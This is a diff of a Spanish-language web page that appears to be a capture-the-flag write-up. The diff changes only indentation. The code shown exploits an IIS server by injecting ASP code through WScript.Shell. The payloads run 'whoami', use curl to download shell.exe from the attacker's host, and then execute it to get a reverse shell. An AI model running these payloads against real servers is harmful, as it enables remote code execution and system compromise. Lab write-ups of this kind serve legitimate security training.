@@ -213,7 +213,7 @@ ID           Response   Lines    Word       Chars       Payload
 <p class="plain-text">Algo a probar ya que corre un <code class="language-plaintext highlighter-rouge">IIS</code> por detras es inyectar codigo <code class="language-plaintext highlighter-rouge">asp</code> ya que al ser reflejado en la preview puede que lo interprete y nos ejecute un comando</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p"><%
-</span><span class="na">Response</span><span class="p">.</span><span class="no">Write</span><span class="p">(</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"whoami"</span><span class="p">).StdOut.ReadAll)  
+  </span><span class="na">Response</span><span class="p">.</span><span class="no">Write</span><span class="p">(</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"whoami"</span><span class="p">).StdOut.ReadAll)  
 %></span>
 </code></pre></div></div><br>
 
@@ -240,13 +240,13 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
 <p class="plain-text">Ahora simplemente como codigo <code class="language-plaintext highlighter-rouge">asp</code> enviamos un payload que descargue el <code class="language-plaintext highlighter-rouge">exe</code> malicioso en la maquina victima y otro que lo ejecute para que nos envie la shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p"><%
-</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe"</span><span class="p">)  
+  </span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe"</span><span class="p">)  
 %></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p"><%
-</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"cmd /c C:\ProgramData\shell.exe"</span><span class="p">)  
+  </span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"cmd /c C:\ProgramData\shell.exe"</span><span class="p">)  
 %></span>
 </code></pre></div></div><br>
 
